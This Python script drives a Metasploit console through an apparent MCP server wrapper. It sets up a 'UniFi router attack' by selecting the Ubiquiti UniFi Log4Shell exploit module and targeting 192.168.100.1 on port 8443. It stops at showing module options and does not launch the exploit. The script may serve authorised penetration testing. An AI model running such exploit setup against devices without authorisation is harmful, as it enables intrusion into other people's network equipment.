#!/usr/bin/env python3
"""
Execute MSF Console commands for UniFi router attack
"""

import asyncio
import json
import sys
from mcp_server_stable import MSFConsoleMCPServer

async def execute_unifi_attack():
    """Execute the UniFi router attack commands"""
    
    # Initialize the MSF Console MCP server
    server = MSFConsoleMCPServer()
    
    print("🚀 Initializing MSF Console MCP Server...")
    try:
        await server.initialize()
        print("✅ MSF Console initialized successfully\n")
    except Exception as e:
        print(f"❌ Failed to initialize MSF Console: {e}")
        return False
    
    commands = [
        ("Create workspace 'unifi_router_attack'", "msf_create_workspace", {"name": "unifi_router_attack"}),
        ("Switch to workspace 'unifi_router_attack'", "msf_switch_workspace", {"name": "unifi_router_attack"}),
        ("Search for UniFi modules", "msf_search_modules", {"query": "unifi", "limit": 10}),
        ("Use exploit/multi/http/ubiquiti_unifi_log4shell", "msf_module_manager", {
            "action": "use", 
            "module_type": "exploit", 
            "module_name": "exploit/multi/http/ubiquiti_unifi_log4shell"
        }),
        ("Set RHOSTS to 192.168.100.1", "msf_module_manager", {
            "action": "set_option", 
            "option_name": "RHOSTS", 
            "option_value": "192.168.100.1"
        }),
        ("Set RPORT to 8443", "msf_module_manager", {
            "action": "set_option", 
            "option_name": "RPORT", 
            "option_value": "8443"
        }),
        ("Set SSL to true", "msf_module_manager", {
            "action": "set_option", 
            "option_name": "SSL", 
            "option_value": "true"
        }),
        ("Show module options", "msf_module_manager", {
            "action": "show_options"
        })
    ]
    
    print("=" * 80)
    print("🎯 EXECUTING UNIFI ROUTER ATTACK COMMANDS")
    print("=" * 80)
    
    for i, (description, tool_name, args) in enumerate(commands, 1):
        print(f"\n[{i}/8] {description}")
        print("-" * 60)
        
        try:
            result = await server.handle_tool_call(tool_name, args)
            
            if "content" in result and result["content"]:
                content = result["content"][0].get("text", "")
                
                # Try to parse as JSON for better formatting
                try:
                    data = json.loads(content)
                    if data.get("success", False):
                        print("✅ SUCCESS")
                        if "data" in data:
                            print(f"📊 Data: {data['data']}")
                        if "output" in data:
                            print(f"📝 Output: {data['output']}")
                    else:
                        print("❌ FAILED")
                        if "error" in data:
                            print(f"💥 Error: {data['error']}")
                        if "output" in data:
                            print(f"📝 Output: {data['output']}")
                except json.JSONDecodeError:
                    # Non-JSON response
                    print(f"📝 Response: {content}")
            else:
                print("❌ Empty response")
                
        except Exception as e:
            print(f"💥 Exception: {str(e)}")
    
    print("\n" + "=" * 80)
    print("🏁 COMMAND EXECUTION COMPLETED")
    print("=" * 80)
    
    return True

if __name__ == "__main__":
    asyncio.run(execute_unifi_attack())